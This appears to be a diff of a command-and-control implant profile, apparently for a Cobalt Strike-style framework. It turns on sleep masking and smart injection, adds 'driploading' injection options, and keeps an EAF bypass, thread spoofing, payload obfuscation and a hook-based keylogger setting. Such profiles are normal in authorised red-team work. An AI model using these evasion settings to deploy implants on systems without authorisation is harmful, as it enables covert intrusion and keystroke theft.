@@ -12,30 +12,32 @@ Jitter: 30
 Debug: true
 Sleep: 35
 Uri: 3
-Useragent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
+Useragent: "Win10Chrome"
 Post-EX Processname: 11
 Datajitter: 40
 Keylogger: "SetWindowsHookEx"
-Customuri: 
+Customuri:
+CustomuriGET:
+CustomuriPOST:
 CDN:
-CDN_Value: 
+CDN_Value:
 ProfilePath:
 Syscall_method:
 Httplib: winhttp
 ThreadSpoof: True
-Customuri: 
-CustomuriGET: 
-CustomuriPOST:
 Forwarder: False
-TasksMaxSize: 
+TasksMaxSize:
 TasksProxyMaxSize:
-TasksDnsProxyMaxSize: 
+TasksDnsProxyMaxSize:
 EafBypass: True
 RdllUseSyscalls: True
 CopyPEHeader: True
-RdllLoader: "PrependLoader"
 TransformObfuscate: "lznt1,xor \"32\""
-SmartInject: False
+SmartInject: True
 BeaconGate: "All"
-SleepMask: False
-
+SleepMask: True
+RdllUseDriploading: False
+RdllDriploadDelay:
+CheckinDelay:
+InjectUseDriploading: False
+InjectDriploadDelay:
